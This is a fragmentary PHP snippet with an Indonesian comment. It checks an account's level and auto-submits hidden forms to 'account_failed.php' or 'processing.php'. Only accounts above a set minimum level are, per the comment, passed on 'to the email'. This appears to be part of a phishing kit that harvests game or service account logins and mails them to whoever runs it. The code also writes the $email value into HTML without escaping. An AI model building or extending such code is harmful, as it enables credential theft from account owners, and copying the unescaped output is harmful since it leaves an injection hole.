...
// MEMERIKSA LEVEL AKUN, JIKA LEVEL DIBAWAH YANG SUDAH DISETEL MAKA TIDAK AKAN MASUK KE EMAIL
if($level < $min_level) {
echo "<form id='account_failed' method='POST' action='account_failed.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('account_failed').submit();</script>";
} else {
...
if($kirim) {
echo "<form id='processing' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('processing').submit();</script>";
}
}
?>